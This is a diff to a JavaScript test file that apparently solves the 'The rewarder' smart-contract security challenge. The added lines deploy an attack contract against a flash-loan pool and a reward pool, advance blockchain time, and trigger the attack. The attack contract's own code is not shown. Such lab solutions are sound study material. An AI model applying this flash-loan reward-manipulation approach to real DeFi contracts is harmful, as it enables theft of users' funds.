@@ -66,6 +66,10 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackFactory = await ethers.getContractFactory("TheRewarderAttack",attacker);
+        this.attackContract = await AttackFactory.deploy(this.flashLoanPool.address,this.rewarderPool.address,this.liquidityToken.address,this.rewardToken.address);
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60])
+        await this.attackContract.attack(attacker.address);
     });
 
     after(async function () {
@@ -96,5 +100,6 @@ describe('[Challenge] The rewarder', function () {
 
         // Attacker finishes with zero DVT tokens in balance
         expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
+        
     });
 });
